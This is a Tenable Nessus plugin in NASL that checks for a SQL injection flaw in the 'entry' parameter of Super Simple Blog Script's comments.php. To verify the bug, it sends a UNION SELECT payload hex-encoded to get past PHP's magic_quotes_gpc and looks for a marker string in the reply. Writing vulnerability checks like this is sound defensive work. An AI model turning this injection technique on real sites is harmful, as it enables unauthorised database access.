#
# (C) Tenable Network Security, Inc.
#


if (NASL_LEVEL < 3000) exit(1);


include("compat.inc");


if (description)
{
  script_id(50048);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2014/08/09 00:11:25 $");

  script_cve_id("CVE-2009-2553");
  script_bugtraq_id(43524);
  script_osvdb_id(55952);
  script_xref(name:"EDB-ID", value:"9180");

  script_name(english:"Super Simple Blog Script entry Parameter SQL Injection");
  script_summary(english:"Tries to manipulate the comment form");

  script_set_attribute(
    attribute:"synopsis",
    value:
"A PHP application hosted on the remote web server is affected by a
SQL injection vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote Super Simple Blog Script install hosted on the remote web
server is affected by a SQL injection vulnerability because its
'comments.php' script does not properly sanitize input to the 'entry'
parameter before using it a database query.

Regardless of PHP's 'magic_quotes_gpc' setting, an unauthenticated
remote attacker can leverage this issue to manipulate database
queries, leading to disclosure of sensitive information, attacks
against the underlying database, and the like.

Note that the application may also be affected by a related local file
inclusion vulnerability, although Nessus has not checked for that."
  );
  script_set_attribute(attribute:"solution", value:"Upgrade to Super Simple Blog Script 2.56 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(89);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/07/17");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/08/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/10/20");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2014 Tenable Network Security, Inc.");

  script_dependencies("super_simple_blog_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/super_simple_blog");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(appname:'super_simple_blog', port:port, exit_on_fail:TRUE);
dir = install['dir'];

# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc.
function hexify(str)
{
  local_var hstr, i, l;

  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}


magic1 = SCRIPT_NAME;
magic2 = unixtime();
exploit = "-1 UNION SELECT 0," + hexify(str:magic2+'" />\r\n<p>NESSUS:<br /><input type="text" name="nessus" style="width:280px;" value="'+magic1);

url = dir + '/comments.php?entry='+str_replace(find:" ", replace:"%20", string:exploit);

r = http_send_recv3(
  port         : port,
  method       : 'GET',
  item         : url,
  exit_on_fail : TRUE
);

if (
  '<input type="hidden" name="orig_time" value="'+magic2+'" />' >< r[2] &&
  '<p>NESSUS:<br /><input type="text" name="nessus" style="width:280px;" value="'+magic1+'" />' >< r[2]
)
{
  set_kb_item(name:"www/"+port+"/SQLInjection", value:TRUE);

  if (report_verbosity > 0)
  {
    report = get_vuln_report(
      items     : url,
      port      : port
    );
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else exit(0, "The Super Simple Blog Script install at "+build_url(port:port, qs:dir+'/')+" is not affected.");
